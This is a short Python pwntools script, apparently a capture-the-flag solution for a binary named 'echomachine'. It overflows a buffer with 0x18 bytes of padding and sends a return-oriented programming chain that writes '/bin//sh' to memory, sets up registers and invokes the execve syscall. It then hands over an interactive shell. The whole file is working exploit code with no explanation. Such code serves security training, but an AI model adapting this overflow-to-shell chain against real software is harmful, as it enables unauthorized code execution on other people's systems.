from pwn import *

p = process('./echomachine')
#r = remote('ctf.adl.tw', 11002) 
raw_input()

# p.recv()
# p.recvline()
# p.recvuntil()

p.send('a' * 0x18 + p64(0x400686) + p64(0x6b6000) +p64(0x4495b5) + '/bin//sh' + p64(0x435333) + p64(0x410183) + p64(0x0) + p64(0x4495b5) + p64(0x0) + p64(0x44955c) + p64(0x3b) + p64(0x474d05))
							
# p.sendline()
# p.sendafter()

p.interactive()
